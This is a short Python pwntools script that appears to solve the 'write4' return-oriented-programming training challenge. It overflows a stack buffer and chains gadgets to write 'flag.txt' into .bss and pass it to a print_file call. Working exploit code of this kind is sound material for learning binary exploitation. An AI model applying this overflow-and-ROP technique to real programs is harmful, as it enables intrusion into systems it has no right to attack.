from pwn import *

p = process('./write4')

pop_rdi = p64(0x0000000000400693)
pop_r14_r15 = p64(0x0000000000400690)
mov_qword_ptr = p64(0x0000000000400628)
print_file_call = p64(0x0000000000400620)
flag_file = p64(0x7478742e67616c66)
reserved_addr_bss = p64(0x0000000000601038)

payload = b'A' * 32 + b'B' * 8

# Write "flag.txt" to bss
payload += pop_r14_r15
payload += reserved_addr_bss # address -> r14
payload += flag_file # flag.txt -> r15
payload += mov_qword_ptr # mov qword ptr [r14], r15 ; ret

# use pop_rdi to set argument, and shove "flag.txt" into printfile call
payload += pop_rdi
payload += reserved_addr_bss
payload += print_file_call

p.sendline(payload)
p.interactive()